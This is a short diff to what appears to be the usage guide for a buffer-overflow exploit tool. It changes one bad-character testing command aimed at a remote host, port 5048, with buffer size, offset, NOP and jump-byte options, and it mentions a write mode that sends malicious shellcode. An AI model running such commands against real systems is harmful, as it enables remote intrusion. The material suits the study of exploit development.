@@ -106,7 +106,7 @@ write - Sends malicious shell code (hex string file) via buffer overflow
 
 5. Bad char testing
 ```
-./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=5048 --buffsize=4096 --buffhead='chk2 /.:/' --offset=3391 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=badchar --nopsb=4 --exclude=00 -v
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=5048 --buffsize=4096 --buffhead='cmd2 /.../' --offset=3391 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=badchar --nopsb=4 --exclude=00 -v
 ```
 
 6. Exploit
